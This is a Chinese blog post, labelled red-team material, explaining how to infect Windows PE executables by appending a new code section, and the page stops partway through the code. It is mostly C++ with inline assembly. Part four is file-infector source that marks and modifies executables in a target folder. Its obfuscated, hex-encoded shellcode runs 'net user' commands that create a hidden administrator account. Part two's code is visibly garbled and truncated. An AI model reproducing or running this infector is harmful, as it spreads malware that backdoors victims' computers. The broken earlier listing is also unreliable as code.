<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Hexo">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Hexo</title>
    <link rel="icon" type="image/png" href="../../../../../../../favicon.png">

    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="../../../../../../../css/matery.css">
    <link rel="stylesheet" type="text/css" href="../../../../../../../css/my.css">

    <script src="../../../../../../../libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="atom.xml" title="Hexo" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="../../../../../../../index.html" class="waves-effect waves-light">
                    
                    <img src="../../../../../../../medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Hexo</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="../../../../../../../index.html" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="../../../../../../../tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="../../../../../../../categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="../../../../../../../archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="../../../../../../../about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="../../../../../../../contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="../../../../../../../friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="../../../../../../../medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Hexo</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="../../../../../../../index.html" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="../../../../../../../tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="../../../../../../../categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="../../../../../../../archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="../../../../../../../about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="../../../../../../../contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="../../../../../../../friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../../../../medias/featureimages/0.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title"></h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="../../../../../../../libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-07-16
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    2.5k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    12 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="../../../../../../../libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="红队增加节方式感染PE文件原理（一）"><a href="#红队增加节方式感染PE文件原理（一）" class="headerlink" title="红队增加节方式感染PE文件原理（一）"></a>红队增加节方式感染PE文件原理（一）</h2><p>所谓感染PE文件，其实就是修改PE文件，在不改变其原有功能的基础上，添加我们自己的代码，在这里我们将PE文件看作是一般的文件，只是在修改时，要根据PE文件结构来进行update，否则的话就会破坏原有程序。这里我们不再对PE文件结构进行解释说明，请读者自行百度哈现在我们说下添加区段的一般步骤</p>
<h6 id="一-修改PE文件头部信息，需要修改的有IMAGE-FILE-HEADER的NumberOfSections（区块数目），IMAGE-OPTIONAL-HEADER的AddressOfEntryPoint，SizeOfImage，以及SizeOfCode，还有就是记录下原有程序的程序入口地点"><a href="#一-修改PE文件头部信息，需要修改的有IMAGE-FILE-HEADER的NumberOfSections（区块数目），IMAGE-OPTIONAL-HEADER的AddressOfEntryPoint，SizeOfImage，以及SizeOfCode，还有就是记录下原有程序的程序入口地点" class="headerlink" title="一.修改PE文件头部信息，需要修改的有IMAGE_FILE_HEADER的NumberOfSections（区块数目），IMAGE_OPTIONAL_HEADER的AddressOfEntryPoint，SizeOfImage，以及SizeOfCode，还有就是记录下原有程序的程序入口地点"></a>一.修改PE文件头部信息，需要修改的有IMAGE_FILE_HEADER的NumberOfSections（区块数目），IMAGE_OPTIONAL_HEADER的AddressOfEntryPoint，SizeOfImage，以及SizeOfCode，还有就是记录下原有程序的程序入口地点</h6><h6 id="二-申请一个IMAGE-SECTION-HEADER的内存模型，该IMAGE-SECTION-HEADER的SizeOfRawData，PointerToRawData，VirtualAddress，Characterics和-Misc-VirtualSize"><a href="#二-申请一个IMAGE-SECTION-HEADER的内存模型，该IMAGE-SECTION-HEADER的SizeOfRawData，PointerToRawData，VirtualAddress，Characterics和-Misc-VirtualSize" class="headerlink" title="二.申请一个IMAGE_SECTION_HEADER的内存模型，该IMAGE_SECTION_HEADER的SizeOfRawData，PointerToRawData，VirtualAddress，Characterics和.Misc.VirtualSize"></a>二.申请一个IMAGE_SECTION_HEADER的内存模型，该IMAGE_SECTION_HEADER的SizeOfRawData，PointerToRawData，VirtualAddress，Characterics和.Misc.VirtualSize</h6><h6 id="2-1-我们会知道要写入汇编代码的长度dwShellLen（该变量的值我们会事先得到）"><a href="#2-1-我们会知道要写入汇编代码的长度dwShellLen（该变量的值我们会事先得到）" class="headerlink" title="2.1 我们会知道要写入汇编代码的长度dwShellLen（该变量的值我们会事先得到）"></a>2.1 我们会知道要写入汇编代码的长度dwShellLen（该变量的值我们会事先得到）</h6><ol>
<li>SizeOfRawData的值就是dwShellLen根据文件对齐值之后的值</li>
<li>PointerToRawData的值就是源程序的最后一个节点的PointerToRawData+最后一个节点的SizeOfRawData</li>
<li>VirtualAddress的值是源程序最后一个节点的VirtualAddress+最后一个节点的根据内存对齐后的区块大小</li>
<li>Characteristic的值改成可读，可写，可执行Misc.VirtualSize的值就是不经过对齐的值（不经过文件对齐，不经过内存对齐，就是原有数据）</li>
</ol>
<h6 id="三-需要写入外壳的汇编代码，需要记下的就是将程序入口点修改成新节点的VirtualAddress。"><a href="#三-需要写入外壳的汇编代码，需要记下的就是将程序入口点修改成新节点的VirtualAddress。" class="headerlink" title="三.需要写入外壳的汇编代码，需要记下的就是将程序入口点修改成新节点的VirtualAddress。"></a>三.需要写入外壳的汇编代码，需要记下的就是将程序入口点修改成新节点的VirtualAddress。</h6><p>3.1在文件中写入外壳代码，需要注意的就是在PE程序中的偏移量是新节点的PointerToRawData</p>
<h2 id="红队增加节方式感染PE文件实现代码（二）"><a href="#红队增加节方式感染PE文件实现代码（二）" class="headerlink" title="红队增加节方式感染PE文件实现代码（二）"></a>红队增加节方式感染PE文件实现代码（二）</h2><pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"
using namespace std;
///
///函数描述：根据所给路径检测文件是否是有效的PE文件
///入口参数：char*描述文件路径
///返回  值：是PE文件则返回true，否则返回false
 
bool isPe(char* exePath)
{
	bool bIsPE=false;
	HANDLE hFile=CreateFile(exePath,
		GENERIC_ALL,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);
	if(INVALID_HANDLE_VALUE==hFile)
	{
		MessageBox(NULL,"文件打开失败",0,0);
		return false;
	}
	::SetFilePointer(hFile,0,NULL,FILE_BEGIN);
	IMAGE_DOS_HEADER DosHeader={0};//DOS文件头
	DWORD dwWrite;
	ReadFile(hFile,&amp;DosHeader,sizeof(IMAGE_DOS_HEADER),&amp;dwWrite,NULL);
	if(DosHeader.e_magic==IMAGE_DOS_SIGNATURE)
	{
		//ODS头部检测成功，开始检测FILE_HEADER
		IMAGE_NT_HEADERS NtHeader={0};
		//将文件指针移动到IMAGE_NT_HEADER的起始位置
		::SetFilePointer(hFile,DosHeader.e_lfanew,NULL,FILE_BEGIN);
		ReadFile(hFile,&amp;NtHeader,sizeof(IMAGE_NT_HEADERS),&amp;dwWrite,0);
		if(NtHeader.Signature==IMAGE_NT_SIGNATURE)
		{
			bIsPE=true;
		}
		else
		{
			bIsPE=false;
		}
	}
	else
	{
		bIsPE=false;
	}
	if(bIsPE)
	{
 
		CloseHandle(hFile);
		return true;
	}
	else
	{
 
		CloseHandle(hFile);
		return false;
 
	}
}
 
DWORD GetAlign(DWORD size,DWORD align)
{
	DWORD dwResult=0;
	if(sizee_lfanew);
	//记录下区块的数目
	WORD dwNumberOfSections=pNtHeader-&gt;FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER LastSection={0};
	int nCurNum=0;
	//记录下原来的OEP
	DWORD dwOldOEP=pNtHeader-&gt;OptionalHeader.AddressOfEntryPoint;
	DWORD dwWrite;
	SetFilePointer(hFile,pDosHeader-&gt;e_lfanew+sizeof(IMAGE_NT_HEADERS),0,0);
	DWORD dwTextBase=0;
	while(nCurNumOptionalHeader.FileAlignment;
	//获得内存对齐值
	DWORD dwSectionAlign=pNtHeader-&gt;OptionalHeader.SectionAlignment;
	DWORD dwShellLen;
	goto shellend;
	 __asm  
    {  
shell:  PUSHAD  
			PUSHFD
			POPFD			  
       POPAD  
    } 
shellend:  
    char*   pShell;  
    BYTE    jmp = 0xE9;  
    __asm  
    {  
        LEA EAX,shell  
        MOV pShell,EAX;  
        LEA EBX,shellend  
        SUB EBX,EAX  
        MOV dwShellLen,EBX  
    }  
	//修改区块的属性
	SectionShell.Characteristics=IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE;
	//新区块在磁盘中的大小
	SectionShell.SizeOfRawData=GetAlign(dwShellLen,dwFileAlign);
	SectionShell.Misc.VirtualSize=dwShellLen;
	//对齐最后一个区段后的大小计算壳区段的虚拟地址
	memcpy(&amp;SectionShell.Name,".try",4);
	SectionShell.VirtualAddress=LastSection.VirtualAddress+GetAlign(LastSection.Misc.VirtualSize,dwSectionAlign);
	SectionShell.PointerToRawData=LastSection.PointerToRawData+LastSection.SizeOfRawData;
	dwNumberOfSections++;
	//区块数目加1
	pNtHeader-&gt;FileHeader.NumberOfSections=dwNumberOfSections;
	DWORD dwAfterSection=GetAlign(dwShellLen,dwFileAlign);
	//修改镜像大小
	pNtHeader-&gt;OptionalHeader.SizeOfImage+=dwAfterSection;
	pNtHeader-&gt;OptionalHeader.SizeOfCode+=dwAfterSection;
	//重新定位入口地址
	pNtHeader-&gt;OptionalHeader.AddressOfEntryPoint=SectionShell.VirtualAddress;
	WriteFile(hFile,&amp;SectionShell,sizeof(SectionShell),&amp;dwWrite,NULL);
	//将外壳程序写入文件
	SetFilePointer(hFile, SectionShell.PointerToRawData ,NULL,FILE_BEGIN);
	WriteFile(hFile,pShell,dwShellLen,&amp;dwWrite,NULL);


	WriteFile(hFile,&amp;jmp, sizeof(jmp),&amp;dwWrite,NULL);
	 dwOldOEP=dwOldOEP-(SectionShell.VirtualAddress+dwShellLen)-5;  
	WriteFile(hFile,&amp;dwOldOEP, sizeof(dwOldOEP),&amp;dwWrite,NULL);
	CloseHandle(hFile);
}
int _tmain(int argc, _TCHAR* argv[])
{

	if(isPe("D:\\project\\tmp\\Debug\\tmp.exe"))
	{
		addNewSection("D:\\project\\tmp\\Debug\\tmp.exe",NULL);
	}
	else
	{
		MessageBox(NULL,"该文件并非PE文件",0,0);
	}
	return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="红队增加节方式感染PE文件核心解读（三）"><a href="#红队增加节方式感染PE文件核心解读（三）" class="headerlink" title="红队增加节方式感染PE文件核心解读（三）"></a>红队增加节方式感染PE文件核心解读（三）</h3><pre class="line-numbers language-none"><code class="language-none">这里有一个需要记下的就是CreateFileMappingA函数的使用，倒数第二和第三个参数，就是文件映射对象的大小，一般最小值的大小不但应该是文件大小，还应该在此基

础上加上要外壳代码的大小，这样就行了，否则的话，就会出现不是有效的win32程序的错误

主要注意的是：应该记下外壳代码的框架

goto shellEnd;

_asm

{

shellCode:
      pushad;

      pushfd;

      popfd;

       popad;
}

shellEnd:

char*        pShell;

DWORD  dwShellLen;

_asm

{

       LEA  eax,shellCode

       MOV pShell,eax;

       LEA  EBX,shellEnd;

       SUB EBX,EAX;

       MOV  dwShellLen,EBX;  
}

这样汇编代码的首地址和汇编代码的长度就被放进了pShell,dwShellLen

还有就是调回原有的起始地点，原有入口地点

dwOldOEP=dwOldOEP-(SectionShell.VirtualAddress+dwShellLen)-5;(5是jmp指令的长度)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="红队另类实战PE感染完整实现代码（四）"><a href="#红队另类实战PE感染完整实现代码（四）" class="headerlink" title="红队另类实战PE感染完整实现代码（四）"></a>红队另类实战PE感染完整实现代码（四）</h2><pre class="line-numbers language-none"><code class="language-none">// PE_Test.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;


//本程序只适用于载入基址定位的。。。非随机基址
//感染指定目录的PE文件
char ItIs[MAX_PATH] = "E:\\test222";
//添加了一个新节区
//然后shellcode是添加一个名为a，密码为a的administrator
//然后PEB定位kernel32只在我的win7 x64电脑上测试成功，可以稍许修改，以通用

//函数功能: 以ALIGN_BASE为对齐度对齐size
//参数说明: 
//size:需要对齐的大小
//ALIGN_BASE:对齐度
//返回值:返回对齐后的大小
DWORD Align(DWORD size, DWORD ALIGN_BASE)
{
	assert(0 != ALIGN_BASE);
	if (size % ALIGN_BASE)
	{
		size = (size / ALIGN_BASE + 1) * ALIGN_BASE;
	}
	return size;
}


//函数功能: 检测感染标识和设置感染标识
//参数说明:
//pDosHdr:执行DOS头
//返回值:是否未被感染, 是-&gt;TRUE, 否-&gt;FALSE
BOOL SetFectFlag(PIMAGE_DOS_HEADER &amp;pDosHdr)
{
	if (*(DWORD*)pDosHdr-&gt;e_res2 == 0x4B4B43)
	{
		return FALSE;
	}
	else
	{
		*(DWORD*)pDosHdr-&gt;e_res2 = 0x4B4B43;
		return TRUE;
	}
}


//函数功能:打开文件并判断文件类型
//参数说明:
//szPath:文件绝对路径
//lpMemory:保存文件内存映射地址
//返回值:是否是PE文件, 是-&gt;TRUE, 否-&gt;FALSE
BOOL CreateFileAndCheck(char *szPath, LPVOID &amp;lpMemory, HANDLE &amp;hFile)
{
	//打开文件
	hFile = CreateFileA(szPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		//printf("CreateFileA %s Failed! ErrorCode = %d\n", szPath, GetLastError());
		return FALSE;
	}
	HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, NULL, NULL, NULL);
	if (!hMap)
	{
		//printf("CreateFileMappingA %s Failed! ErrorCode = %d\n", szPath, GetLastError());
		return FALSE;
	}
	lpMemory = MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, NULL);
	if (!lpMemory)
	{
		//printf("MapViewOfFile %s Failed! ErrorCode = %d\n", szPath, GetLastError());
		CloseHandle(hMap);
		return FALSE;
	}


	CloseHandle(hMap);
	return TRUE;
}


//函数功能: 感染指定文件
//参数说明:
//szPath:文件绝对路径
void FectPE(char *szPath)
{
	LPVOID lpMemory;
	HANDLE hFile;
	if (!CreateFileAndCheck(szPath, lpMemory, hFile))
	{
		return;
	}
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpMemory;
	//判断DOS标识
	if (*(WORD*)pDosHdr != 23117)
		goto Err;


	PIMAGE_NT_HEADERS32 pNtHdr = (PIMAGE_NT_HEADERS32)(*(DWORD*)&amp;pDosHdr + (DWORD)pDosHdr-&gt;e_lfanew);
	//判断NT标识
	if (*(WORD*)pNtHdr != 17744)
		goto Err;


	//设置感染标识
	if (!SetFectFlag(pDosHdr))
		goto Err;


	//检查可用空间
	if ((pNtHdr-&gt;FileHeader.NumberOfSections + 1) * sizeof(IMAGE_SECTION_HEADER) &gt; pNtHdr-&gt;OptionalHeader.SizeOfHeaders)
		goto Err;


	PIMAGE_SECTION_HEADER pSecHdr = (PIMAGE_SECTION_HEADER)(*(DWORD*)&amp;pNtHdr + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER pNewHdr = (PIMAGE_SECTION_HEADER)(pSecHdr + pNtHdr-&gt;FileHeader.NumberOfSections);
	PIMAGE_SECTION_HEADER pLastHdr = (PIMAGE_SECTION_HEADER)(pNewHdr - 1);


	//检测是否有附加数据
	DWORD i = 0;
	DWORD size = pSecHdr-&gt;PointerToRawData;
	for (; i &lt; pNtHdr-&gt;FileHeader.NumberOfSections; i++)
	{
		size += Align(pSecHdr-&gt;SizeOfRawData, pNtHdr-&gt;OptionalHeader.FileAlignment);
	}
	if (size != GetFileSize(hFile, 0))
	{
		return;//有附加数据
	}


	goto shellend;
	_asm
	{
	shellstart:
		pushad
			mov eax, fs : [0x30]; 
			mov eax, [eax + 0x0c]; 
			mov esi, [eax + 0x1c]
			lodsd; 
			mov eax, [eax]; 
			mov eax, [eax + 0x08]; 
			mov ebp, eax


			mov eax, dword ptr[eax + 0x3c]; 
			mov eax, dword ptr[eax + ebp + 0x78]; 
			mov ecx, [ebp + eax + 24];
			mov ebx, [ebp + eax + 32]; 
			add ebx, ebp

			push dword ptr 0x00007373; 
			push dword ptr 0x65726464
			push dword ptr 0x41636F72
			push dword ptr 0x50746547
			mov  edx, esp
			push ecx
		loc1:
		        mov edi, edx
			pop ecx
			dec ecx
			test ecx, ecx
	        jz exit
			mov esi, [ebx + ecx * 4]
			add esi, ebp
			push ecx
			mov ecx, 15
			repz cmpsb
			test ecx, ecx
			jnz loc1


			pop ecx; ecx = 0x244
			mov esi, [ebp + eax + 36]; 
			add esi, ebp
			movzx esi, word ptr[esi + ecx * 2]; 
			mov edi, [ebp + eax + 28]; 
			add edi, ebp
			mov edi, [edi + esi * 4]; 
			add edi, ebp; edi = 0x771F1222


			/*xor ebx,ebx;构造LoadLibraryA字符串
			push ebx
			push dword ptr 0x41797261
			push dword ptr 0x7262694C
			push dword ptr 0x64616F4C
			push esp
			push ebp
			call edi;0x771F4977
			add esp,16;恢复堆栈

			push dword ptr 0x00006C6C;构造msvcrt.dll字符串
			push dword ptr 0x642E7472
			push dword ptr 0x6376736D
			push esp
			call eax;75AA0000
			add esp,12;恢复堆栈
			*/
			push dword ptr 0x00636578; 
			push dword ptr 0x456E6957
			push esp
			push ebp
			call edi;
		add esp, 8
			push eax
			xor ebx, ebx; 
			push ebx
			push dword ptr 0x6464612F
			push dword ptr 0x20612061
			push dword ptr 0x20726573
			push dword ptr 0x75207465
			push dword ptr 0x6E20632F
			push dword ptr 0x20646D63
			push ebx
			mov ebx, esp
			add ebx, 4
			push ebx
			call eax
			add esp, 28; 
			pop eax
			push DWORD ptr 0x00646461; 
			push DWORD ptr 0X2F206120
			push DWORD ptr 0X73726F74
			push DWORD ptr 0X61727473
			push DWORD ptr 0X696E696D
			push DWORD ptr 0X64612070
			push DWORD ptr 0X756F7267
			push DWORD ptr 0X6C61636F
			push DWORD ptr 0X6C207465
			push DWORD ptr 0X6E20632F
			push DWORD ptr 0X20646D63
			push DWORD ptr 0
			mov ebx, esp
			add ebx, 4
			push ebx
			call eax
			add esp, 44
		exit:
		add esp, 16
			popad
			mov eax, 0x11111111
			jmp eax
	}
shellend:
	PBYTE *pShell;
	DWORD nShellLen;
	_asm
	{
		lea eax, shellstart
			mov pShell, eax
			lea ebx, shellend
			sub ebx, eax
			mov nShellLen, ebx
	}
	//添加新节
	memcpy(pNewHdr-&gt;Name, ".kill", 4);
	pNewHdr-&gt;VirtualAddress = pLastHdr-&gt;VirtualAddress + Align(pLastHdr-&gt;Misc.VirtualSize, pNtHdr-&gt;OptionalHeader.SectionAlignment);
	pNewHdr-&gt;PointerToRawData = pLastHdr-&gt;PointerToRawData + Align(pLastHdr-&gt;SizeOfRawData, pNtHdr-&gt;OptionalHeader.FileAlignment);
	//新加节virtualsize
	DWORD nSecSize = nShellLen;
